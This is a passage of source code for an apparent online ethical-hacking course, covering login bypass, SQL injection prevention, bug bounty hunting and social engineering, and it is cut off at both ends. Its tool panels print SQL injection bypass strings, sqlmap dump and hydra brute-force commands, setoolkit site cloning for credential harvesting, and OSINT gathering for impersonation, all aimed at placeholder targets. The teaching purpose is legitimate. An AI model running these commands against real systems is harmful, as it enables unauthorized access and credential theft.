                <li><strong class="text-white">Brute Force Attack:</strong> Systematically trying multiple username-password combinations.</li>
                <li><strong class="text-white">Password Spraying:</strong> Trying a few common passwords across many accounts.</li>
                <li><strong class="text-white">Bypassing via Cookies or Tokens:</strong> Manipulating session cookies or JWTs.</li>
                <li><strong class="text-white">Exploiting Logic Flaws:</strong> Weaknesses in authentication logic (e.g., skipping password verification).</li>
              </ul>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Real-World Example</h4>
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <p class="text-gray-300">A web application login is vulnerable to SQL injection. By inputting <code class="text-green-400">admin' OR '1'='1</code>, the attacker can bypass the password check and gain admin access.</p>
              </div>
            </div>
          </div>
        `,
        syntax: [
          {
            title: 'Kali Linux Commands / Tools',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Login Bypass Tools & Commands</h4>
                  <p class="text-gray-300 mb-4">Here are practical methods to bypass login panels using Kali Linux tools. ⚠️ Use only on authorized targets.</p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Using sqlmap for Login Bypass</h4>
                  <div class="bg-[#1e1e1e] p-3 rounded border border-[#333] mb-4">
                    <h5 class="text-white font-medium mb-1 text-sm">Test Login Form (POST)</h5>
                    <code class="text-green-400 block mb-1 font-mono text-sm break-all">sqlmap -u "http://targetsite.com/login.php" --data="username=admin&password=1234" --risk=3 --level=5 --batch --dump</code>
                    <p class="text-sm text-gray-400">Automates SQL injection detection on login fields.</p>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Using Hydra for Brute Force</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Brute Force HTTP Login</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">hydra -l admin -P /usr/share/wordlists/rockyou.txt targetsite.com http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid login"</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Brute Force FTP Login</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://targetsite.com</code>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Manual SQL Injection Payloads</h4>
                  <div class="bg-[#1e1e1e] p-3 rounded border border-[#333] mb-4">
                    <div class="mb-2">
                      <span class="text-gray-400 text-sm">Username:</span>
                      <code class="text-green-400 font-mono text-sm ml-2">' OR '1'='1</code>
                    </div>
                    <div>
                      <span class="text-gray-400 text-sm">Password:</span>
                      <span class="text-gray-500 text-sm ml-2">(leave blank or anything)</span>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Testing Default Credentials</h4>
                  <div class="bg-[#1e1e1e] p-3 rounded border border-[#333] mb-4">
                    <h5 class="text-white font-medium mb-1 text-sm">Using Nmap Script</h5>
                    <code class="text-green-400 block mb-1 font-mono text-sm break-all">nmap --script http-default-accounts -p 80,443 targetsite.com</code>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Using Burp Suite</h4>
                  <ul class="list-disc list-inside text-gray-300 space-y-1 text-sm">
                    <li>Intercept login requests.</li>
                    <li>Modify POST parameters with SQLi payloads or logic bypass techniques.</li>
                    <li>Replay and test responses to gain access.</li>
                  </ul>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Preventing SQL Injection',
        duration: '20 min',
        content: `
          <div class="space-y-6">
            <div>
              <h4 class="text-lg font-semibold text-white mb-2">Preventing SQL Injection</h4>
              <p class="text-gray-300 mb-4">Preventing SQL Injection (SQLi) focuses on securing applications so that malicious SQL queries cannot be executed. This is a defensive topic, essential for developers, security engineers, and penetration testers to understand how vulnerabilities should be fixed after discovery.</p>
              <p class="text-gray-300">SQL Injection occurs mainly due to improper input handling and insecure query construction.</p>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Core Prevention Techniques</h4>
              <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
                <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                  <h5 class="text-white font-medium mb-2">Primary Defenses</h5>
                  <ul class="list-disc list-inside text-gray-300 space-y-1 text-sm">
                    <li><strong class="text-white">Prepared Statements:</strong> Ensures user input is treated as data, not executable SQL code.</li>
                    <li><strong class="text-white">Input Validation & Sanitization:</strong> Filters unexpected characters and enforces strict input rules.</li>
                    <li><strong class="text-white">Stored Procedures:</strong> Encapsulates SQL logic on the database side (securely implemented).</li>
                  </ul>
                </div>
                <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                  <h5 class="text-white font-medium mb-2">Defense in Depth</h5>
                  <ul class="list-disc list-inside text-gray-300 space-y-1 text-sm">
                    <li><strong class="text-white">Least Privilege Principle:</strong> Database users should have only required permissions.</li>
                    <li><strong class="text-white">WAFs:</strong> Web Application Firewalls block common SQLi payloads.</li>
                    <li><strong class="text-white">Error Handling:</strong> Avoid displaying verbose database errors to users.</li>
                  </ul>
                </div>
              </div>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Why Prevention is Critical</h4>
              <ul class="list-disc list-inside text-gray-300 space-y-1 mb-4">
                <li>Prevents data breaches</li>
                <li>Protects user credentials</li>
                <li>Maintains application integrity</li>
                <li>Required for compliance and security audits</li>
              </ul>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Real-World Example</h4>
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <p class="text-gray-300">A login form vulnerable to SQL injection is fixed by switching from dynamic SQL queries to <span class="text-green-400">prepared statements</span>, preventing attackers from manipulating the query logic.</p>
              </div>
            </div>
          </div>
        `,
        syntax: [
          {
            title: 'Defensive Testing Tools',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Verifying Protections</h4>
                  <p class="text-gray-300 mb-4">Although prevention is implemented in code, Kali Linux tools help verify that protections are working effectively.</p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Testing with SQLMap</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Verify Fix (Check Vulnerability)</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">sqlmap -u "http://targetsite.com/page.php?id=1" --batch</code>
                      <p class="text-sm text-gray-400">Should fail to inject if fixed.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Test WAF Detection</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">sqlmap -u "http://targetsite.com/page.php?id=1" --identify-waf</code>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Vulnerability Scanning</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Nikto Scan</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">nikto -h http://targetsite.com</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Nmap SQLi Scripts</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">nmap --script http-sql-injection -p 80,443 targetsite.com</code>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Manual Verification & Monitoring</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Input Validation Test</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">curl "http://targetsite.com/page.php?id=' OR '1'='1"</code>
                      <p class="text-sm text-gray-400">Injecting special characters to test filtering.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Monitoring Logs</h5>
                      <div class="text-green-400 font-mono text-sm mb-1">
                        tail -f /var/log/apache2/access.log<br/>
                        tail -f /var/log/apache2/error.log
                      </div>
                      <p class="text-sm text-gray-400">Watch for SQLi attempts in real-time.</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Important Notes</h4>
                  <ul class="list-disc list-inside text-gray-300 space-y-1 text-sm">
                    <li>Kali tools are used to <strong>confirm fixes</strong>, not to implement them.</li>
                    <li>Prevention is a shared responsibility between developers and security teams.</li>
                    <li>Always re-test after applying patches.</li>
                  </ul>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'What is Bug Bounty Hunting?',
        duration: '20 min',
        content: `
          <div class="space-y-6">
            <div>
              <h4 class="text-lg font-semibold text-white mb-2">What is Bug Bounty Hunting?</h4>
              <p class="text-gray-300 mb-4">Bug Bounty Hunting is the practice of legally finding and reporting security vulnerabilities in applications, websites, or systems in exchange for recognition or monetary rewards. Companies run bug bounty programs to improve security by allowing ethical hackers to test their systems under defined rules.</p>
              <p class="text-gray-300 mb-4">Bug bounty hunting is different from illegal hacking because it is done with <strong>permission</strong>, within a <strong>defined scope</strong>, and follows <strong>responsible disclosure</strong>.</p>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Key Concepts</h4>
              <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                  <h5 class="text-white font-medium mb-2">Definitions</h5>
                  <ul class="list-disc list-inside text-gray-300 space-y-1 text-sm">
                    <li><strong class="text-white">Bug:</strong> A security vulnerability or weakness.</li>
                    <li><strong class="text-white">Bounty:</strong> A reward given for valid vulnerability reports.</li>
                  </ul>
                </div>
                <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                  <h5 class="text-white font-medium mb-2">Rules</h5>
                  <ul class="list-disc list-inside text-gray-300 space-y-1 text-sm">
                    <li><strong class="text-white">Scope:</strong> Defines what assets (domains, IPs, apps) are allowed to be tested.</li>
                    <li><strong class="text-white">Rules of Engagement:</strong> Guidelines on what techniques are permitted or prohibited.</li>
                  </ul>
                </div>
              </div>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Common Vulnerabilities Reported</h4>
              <ul class="list-disc list-inside text-gray-300 space-y-2 mb-4 columns-1 md:columns-2">
                <li>SQL Injection</li>
                <li>Cross-Site Scripting (XSS)</li>
                <li>Authentication bypass</li>
                <li>Insecure direct object references (IDOR)</li>
                <li>Business logic flaws</li>
              </ul>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Bug Bounty Platforms</h4>
              <div class="flex flex-wrap gap-2 mb-4">
                <span class="bg-[#333] text-white px-3 py-1 rounded text-sm border border-[#444]">HackerOne</span>
                <span class="bg-[#333] text-white px-3 py-1 rounded text-sm border border-[#444]">Bugcrowd</span>
                <span class="bg-[#333] text-white px-3 py-1 rounded text-sm border border-[#444]">Intigriti</span>
                <span class="bg-[#333] text-white px-3 py-1 rounded text-sm border border-[#444]">YesWeHack</span>
              </div>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Bug Bounty Workflow</h4>
              <ol class="list-decimal list-inside text-gray-300 space-y-2 mb-4">
                <li>Choose a program and read scope carefully</li>
                <li>Perform reconnaissance and testing</li>
                <li>Identify a valid vulnerability</li>
                <li>Create a clear and detailed report</li>
                <li>Submit responsibly and wait for triage</li>
              </ol>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Why Bug Bounty is Important</h4>
              <ul class="list-disc list-inside text-gray-300 space-y-1 text-sm">
                <li>Helps organizations find real-world security issues</li>
                <li>Gives ethical hackers practical experience</li>
                <li>Improves application security continuously</li>
              </ul>
            </div>
          </div>
        `,
        syntax: [
          {
            title: 'Kali Linux Commands / Tools',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Bug Bounty Tools & Commands</h4>
                  <p class="text-gray-300 mb-4">Bug bounty hunting is methodology-driven, but Kali tools are heavily used during testing.</p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Reconnaissance Tools</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Subdomain Enumeration</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">subfinder -d target.com</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Live Host Checking</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">httpx -l subdomains.txt</code>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Vulnerability Scanning</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">SQL Injection Testing</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">sqlmap -u "http://target.com/page.php?id=1"</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">XSS Testing</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">dalfox url http://target.com</code>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Directory & Endpoint Discovery</h4>
                  <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                    <h5 class="text-white font-medium mb-1 text-sm">Directory Brute Force</h5>
                    <code class="text-green-400 block mb-1 font-mono text-sm break-all">gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt</code>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Automation for Bug Bounty</h4>
                  <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                    <h5 class="text-white font-medium mb-1 text-sm">Nuclei Vulnerability Scanning</h5>
                    <code class="text-green-400 block mb-1 font-mono text-sm break-all">nuclei -u http://target.com</code>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Evidence Collection</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Capture HTTP Requests</h5>
                      <p class="text-gray-300 text-sm mb-1">Use <strong>Burp Suite</strong> to intercept and modify traffic.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Take Screenshots for Reports</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">gowitness file -f urls.txt</code>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Important Notes</h4>
                  <ul class="list-disc list-inside text-gray-300 space-y-1 text-sm">
                    <li><strong class="text-red-400">Never test assets outside scope.</strong></li>
                    <li>Avoid DoS and destructive attacks.</li>
                    <li>Quality reports matter more than quantity.</li>
                    <li>Ethical behavior is mandatory in bug bounty hunting.</li>
                  </ul>
                </div>
              </div>
            `
          }
        ]
      }
    ]
  },
  {
    id: 'module-5',
    title: 'Module 5: Social Engineering Attacks',
    duration: '1 week',
    description: 'Study the art of human hacking and psychological manipulation.',
    lessons: [
      {
        title: 'Introduction to Social Engineering',
        duration: '15 min',
        content: `
          <div class="space-y-6">
            <div>
              <h4 class="text-lg font-semibold text-white mb-2">Introduction to Social Engineering</h4>
              <p class="text-gray-300 mb-4">Social engineering is a cyber attack technique that focuses on manipulating human behavior instead of exploiting technical vulnerabilities. Attackers trick individuals into revealing confidential information, granting access, or performing actions that compromise security.</p>
              <p class="text-gray-300 mb-4">Unlike malware or network attacks, social engineering works by exploiting human emotions and psychology such as trust, fear, urgency, curiosity, and authority. This makes it extremely effective even in organizations with strong technical security controls.</p>
              <p class="text-gray-300 mb-4">Social engineering attacks are commonly used as the first step in larger attacks such as data breaches, ransomware, and account takeovers.</p>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Why social engineering is dangerous</h4>
              <ul class="list-disc list-inside text-gray-300 space-y-1 text-sm">
                <li>Humans can be deceived more easily than systems</li>
                <li>Security policies can be bypassed by persuasion</li>
                <li>No software patch can fully prevent it</li>
                <li>Often leads to credential theft and unauthorized access</li>
              </ul>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Common objectives of social engineering</h4>
              <ul class="list-disc list-inside text-gray-300 space-y-1 text-sm">
                <li>Steal usernames and passwords</li>
                <li>Gain physical or logical access</li>
                <li>Install malware</li>
                <li>Collect sensitive business or personal information</li>
              </ul>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Example</h4>
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <p class="text-gray-300">An attacker emails an employee pretending to be IT support and requests login credentials to “fix an urgent system issue”.</p>
              </div>
            </div>
          </div>
        `,
        syntax: [
          {
            title: 'Kali Linux Tools for Social Engineering Awareness & Testing',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Social Engineering Tools</h4>
                  <p class="text-gray-300 mb-4">Although social engineering is human‑focused, Kali Linux provides tools to simulate and test awareness.</p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Tools & Commands</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Launch Social Engineering Toolkit</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">setoolkit</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Gather Publicly Available Information (OSINT)</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">theHarvester -d target.com -b google</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Advanced OSINT Framework</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">recon-ng</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Email Server Reconnaissance</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">nmap -p 25,465,587 target.com</code>
                    </div>
                  </div>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Pretexting Techniques',
        duration: '15 min',
        content: `
          <div class="space-y-6">
            <div>
              <h4 class="text-lg font-semibold text-white mb-2">What is Pretexting?</h4>
              <p class="text-gray-300 mb-4">Pretexting is a social engineering technique where an attacker creates a fabricated scenario (pretext) to convince a victim to disclose sensitive information or perform a specific action. The success of pretexting depends on how believable and consistent the attacker’s story is.</p>
              <p class="text-gray-300 mb-4">Unlike phishing, which often relies on mass communication, pretexting is usually targeted and interactive. Attackers often conduct thorough research before engaging with the victim to make the pretext appear legitimate.</p>
              <p class="text-gray-300 mb-4">Pretexting exploits trust in authority, routine processes, and familiarity. The attacker may pose as an IT administrator, HR representative, bank officer, vendor, delivery agent, or even a coworker.</p>
            </div>
            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Common Pretexting Scenarios</h4>
              <ul class="list-disc list-inside text-gray-300 space-y-1 text-sm">
                <li>IT support requesting password verification</li>
                <li>HR asking for employee details during “policy updates”</li>
                <li>Bank representatives confirming account activity</li>
                <li>Vendors requesting invoice or payment details</li>
              </ul>
            </div>
            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Why pretexting works</h4>
              <ul class="list-disc list-inside text-gray-300 space-y-1 text-sm">
                <li>Victims assume the attacker has legitimate access</li>
                <li>Attackers use insider terminology</li>
                <li>Urgency and professionalism reduce suspicion</li>
                <li>People fear consequences of non‑compliance</li>
              </ul>
            </div>
            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Real‑world example</h4>
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <p class="text-gray-300">An attacker calls an employee pretending to be from the IT department and claims that the user’s account will be locked unless credentials are verified immediately.</p>
              </div>
            </div>
          </div>
        `,
        syntax: [
          {
            title: 'Kali Linux Tools for Pretexting Support & Simulation',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Kali Linux Tools for Pretexting Support & Simulation</h4>
                  <p class="text-gray-300 mb-4">Pretexting relies heavily on information gathering and scenario building. Kali tools help attackers or defenders simulate this legally.</p>
                </div>
                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Tools & Commands</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Gather emails, subdomains, and public info</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">theHarvester -d target.com -b google,linkedin</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Advanced OSINT framework for profiling</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">recon-ng</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Extract metadata from documents (names, software, emails)</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">exiftool file.pdf</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">WHOIS information for organizational details</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">whois target.com</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">DNS records for infrastructure understanding</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">dig target.com ANY</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Social Engineering Toolkit for pretext-based attacks</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">setoolkit</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Create and host fake login pages (authorized testing)</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">setoolkit</code>
                      <p class="text-gray-400 text-xs mt-1">Select: Social Engineering Attacks → Website Attack Vectors</p>
                    </div>
                  </div>
                </div>
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Key Takeaway</h4>
                  <p class="text-gray-300">Pretexting is effective because it mimics legitimate workflows. Strong verification procedures and employee awareness are the best defenses.</p>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Impersonation Attacks',
        duration: '15 min',
        content: `
          <div class="space-y-6">
            <div>
              <h4 class="text-lg font-semibold text-white mb-2">What are Impersonation Attacks?</h4>
              <p class="text-gray-300 mb-4">Impersonation attacks are social engineering attacks where an attacker pretends to be a trusted individual or authority to manipulate a victim into revealing sensitive information or granting access. The attacker does not rely on malware or exploits but instead abuses identity trust.</p>
              <p class="text-gray-300 mb-4">Impersonation attacks are extremely effective in organizations because employees are trained to cooperate with authority figures such as managers, IT staff, vendors, or security teams.</p>
              <p class="text-gray-300 mb-4">Unlike pretexting, impersonation focuses more on who the attacker claims to be, rather than the story itself.</p>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Common Impersonation Roles</h4>
              <ul class="list-disc list-inside text-gray-300 space-y-1 text-sm">
                <li>IT administrator or helpdesk</li>
                <li>Company manager or CEO</li>
                <li>Vendor or third‑party support</li>
                <li>Bank or service provider</li>
                <li>Government or compliance officer</li>
              </ul>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Attack Methods</h4>
              <ul class="list-disc list-inside text-gray-300 space-y-1 text-sm">
                <li>Email impersonation</li>
                <li>Phone calls (voice impersonation)</li>
                <li>Fake login portals</li>
                <li>Physical impersonation with badges or uniforms</li>
              </ul>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Why Impersonation Works</h4>
              <ul class="list-disc list-inside text-gray-300 space-y-1 text-sm">
                <li>Employees fear authority</li>
                <li>Verification steps are skipped</li>
                <li>Busy environments reduce attention</li>
                <li>Attackers use insider terminology</li>
              </ul>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Real‑world Example</h4>
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <p class="text-gray-300">An attacker sends an email impersonating the company IT admin and asks employees to log in to a “security upgrade portal,” capturing their credentials.</p>
              </div>
            </div>
          </div>
        `,
        syntax: [
          {
            title: 'Kali Linux Tools for Impersonation Simulation',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Social Engineering Toolkit (SET)</h4>
                  <p class="text-gray-300 mb-4">Used to simulate impersonation attacks such as fake portals and credential harvesting (authorized testing only).</p>
                  
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Launch SET</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">setoolkit</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Update SET to latest version</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">setoolkit --update</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Start social engineering attack menu</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">setoolkit</code>
                      <p class="text-gray-400 text-xs mt-1">Select: 1) Social-Engineering Attacks</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Choose website attack vectors</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">setoolkit</code>
                      <p class="text-gray-400 text-xs mt-1">Select: 2) Website Attack Vectors</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Clone a legitimate website</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">setoolkit</code>
                      <p class="text-gray-400 text-xs mt-1">Select: Credential Harvester Attack Method</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">theHarvester</h4>
                  <p class="text-gray-300 mb-4">Used for gathering emails, names, and infrastructure details to make impersonation more believable.</p>

                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Collect emails and hosts from Google</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">theHarvester -d target.com -b google</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Collect data from LinkedIn</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">theHarvester -d target.com -b linkedin</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Use multiple sources</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">theHarvester -d target.com -b google,bing,linkedin</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Save output to a file</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">theHarvester -d target.com -b google -f output.html</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Limit results</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">theHarvester -d target.com -b google -l 100</code>
                    </div>
                  </div>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Physical Social Engineering Attacks',
        duration: '15 min',
        content: `
          <div class="space-y-6">
            <div>
              <h4 class="text-lg font-semibold text-white mb-2">What are Physical Social Engineering Attacks?</h4>
              <p class="text-gray-300 mb-4">Physical social engineering attacks involve manipulating people to gain unauthorized physical access to buildings, restricted areas, or devices. Instead of breaking locks or alarms, attackers exploit human courtesy, trust, and routine behavior.</p>
              <p class="text-gray-300 mb-4">These attacks are dangerous because once physical access is obtained, attackers can bypass many technical controls such as firewalls, IDS, and authentication systems.</p>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Common Objectives</h4>
              <ul class="list-disc list-inside text-gray-300 space-y-1 text-sm">
                <li>Access secure offices or server rooms</li>
                <li>Plant malicious USB devices</li>
                <li>Steal documents or hardware</li>
                <li>Connect rogue devices to internal networks</li>
              </ul>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Common Techniques</h4>
              <ul class="list-disc list-inside text-gray-300 space-y-1 text-sm">
                <li>Posing as technicians or maintenance staff</li>
                <li>Wearing fake ID badges or uniforms</li>
                <li>Carrying tools or boxes to appear legitimate</li>
                <li>Claiming urgency or authority</li>
                <li>Exploiting unlocked doors or unattended systems</li>
              </ul>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Real‑world Example</h4>
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
